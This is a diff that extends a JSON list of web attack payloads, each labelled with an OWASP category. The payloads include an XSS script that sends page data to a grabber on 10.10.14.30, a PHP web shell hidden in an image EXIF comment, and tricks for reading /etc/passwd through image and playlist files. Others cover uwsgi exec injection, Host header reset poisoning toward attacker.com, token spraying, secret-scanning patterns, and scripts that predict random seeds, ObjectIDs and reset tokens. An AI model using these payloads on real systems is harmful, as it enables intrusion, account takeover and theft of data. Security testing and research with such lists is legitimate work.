@@ -668,5 +668,125 @@
         "id": 134,
         "payload": "<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>",
         "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 135,
+        "payload": "convert -size 110x110 xc:white payload.jpg\nexiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 136,
+        "payload": "AddType mime-type extension [extension ...]",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 137,
+        "payload": "AddType application/x-httpd-php .rce",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 138,
+        "payload": "convert shellexec.jpeg whatever.gif",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 139,
+        "payload": "apt-get install pngcrush imagemagick exiftool exiv2 -y\n    pngcrush -text a \"profile\" \"/etc/passwd\" exploit.png",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 140,
+        "payload": "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nGOD.txt\n#EXTINF:1.0\n/etc/passwd\n#EXT-X-ENDLIST",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 141,
+        "payload": "[uwsgi]\n; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n; read from binary appended data\nbar = @(data://[REDACTED])\n; read from http\ntest = @(http://[REDACTED])\n; read from a file descriptor\ncontent = @(fd://[REDACTED])\n; read from a process stdout\nbody = @(exec://whoami)\n; call a function returning a char *\ncharacters = @(call://uwsgi_func)",
+        "owaspCategory": "Security Misconfiguration"
+    },
+    {
+        "id": 142,
+        "payload": "<?php\n    $user_id = $_GET['user_id'];\n    $user_info = get_user_info($user_id);\n    ...",
+        "owaspCategory": "Broken Access Control"
+    },
+    {
+        "id": 143,
+        "payload": "https://example.com/profile?user_id=124",
+        "owaspCategory": "Broken Access Control"
+    },
+    {
+        "id": 144,
+        "payload": "POST https://example.com/reset.php HTTP/1.1\r\n    Accept: */*\r\n    Content-Type: application/json\r\n    Host: attacker.com",
+        "owaspCategory": "Broken Access Control"
+    },
+    {
+        "id": 145,
+        "payload": "nuclei -t token-spray/ -var token=token_list.txt",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 146,
+        "payload": "# Example of hardcoded API key\n    api_key = \"1234567890abcdef\"",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 147,
+        "payload": "## Scan a Github Organization\n    docker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity\n    \n    ## Scan a GitHub Repository, its Issues and Pull Requests\n    docker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 148,
+        "payload": "# Scan a Docker image for verified secrets\n    docker run --rm -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 149,
+        "payload": "patterns:\n  - pattern:\n      name: AWS API Gateway\n      regex: '[0-9a-z]+.execute-api.[0-9a-z._-]+.amazonaws.com'\n      confidence: low\n  - pattern:\n      name: AWS API Key\n      regex: AKIA[0-9A-Z]{16}\n      confidence: high",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 150,
+        "payload": "curl https://api.telegram.org/bot<TOKEN>/getMe",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 151,
+        "payload": "import random\nimport time\n\nseed = int(time.time())\nrandom.seed(seed)\nprint(random.randint(1, 100))",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 152,
+        "payload": "import random\nimport time\n\n# Seed based on the provided timestamp\nseed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))\nrandom.seed(seed)\n\n# Generate the random number\nprint(random.randint(1, 100))",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 153,
+        "payload": "$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00\n    UUID version: 1\n    UUID time: 2022-04-13 08:06:13.202186\n    UUID timestamp: 138691299732021860\n    UUID node: 91754721024\n    UUID MAC address: 00:15:5d:01:ef:00\n    UUID clock sequence: 2099\n    \n    $ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 154,
+        "payload": "./mongo-objectid-predict 5ae9b90a2c144b9def01ec37\n    5ae9bac82c144b9def01ec39\n    5ae9bacf2c144b9def01ec3a\n    5ae9bada2c144b9def01ec3b",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 155,
+        "payload": "def MongoDB_ObjectID(timestamp, process, counter):\n        return \"%08x%10x%06x\" % (\n            timestamp,\n            process,\n            counter,\n        )\n\n    def reverse_MongoDB_ObjectID(token):\n        timestamp = int(token[0:8], 16)\n        process = int(token[8:18], 16)\n        counter = int(token[18:24], 16)\n        return timestamp, process, counter\n\n\n    def check(token):\n        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n        return token == MongoDB_ObjectID(timestamp, process, counter)\n\n    tokens = [\"5ae9b90a2c144b9def01ec37\", \"5ae9bac82c144b9def01ec39\"]\n    for token in tokens:\n        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)\n        print(f\"{token}: {timestamp} - {process} - {counter}\")",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 156,
+        "payload": "import math\nimport datetime\n\ndef uniqid(timestamp: float) -> str:\n    sec = math.floor(timestamp)\n    usec = round(1000000 * (timestamp - sec))\n    return \"%8x%05x\" % (sec, usec)\n\ndef reverse_uniqid(value: str) -> float:\n    sec = int(value[:8], 16)\n    usec = int(value[8:], 16)\n    return float(f\"{sec}.{usec}\")\n\ntokens = [\"6659cea087cd6\" , \"6659cea087cea\"]\nfor token in tokens:\n    t = float(reverse_uniqid(token))\n    d = datetime.datetime.fromtimestamp(t)\n    print(f\"{token} - {t} => {d}\")",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 157,
+        "payload": "./display_mt_rand.php 12345678 123\n712530069 674417379\n\n./reverse_mt_rand.py 712530069 674417379 123 1",
+        "owaspCategory": "Cryptographic Failures"
+    },
+    {
+        "id": 158,
+        "payload": "reset-tolkien detect 660430516ffcf -d \"Wed, 27 Mar 2024 14:42:25 GMT\" --prefixes \"attacker@example.com\" --suffixes \"attacker@example.com\" --timezone \"-7\"\n    reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format=\"uniqid\"",
+        "owaspCategory": "Cryptographic Failures"
     }
 ]
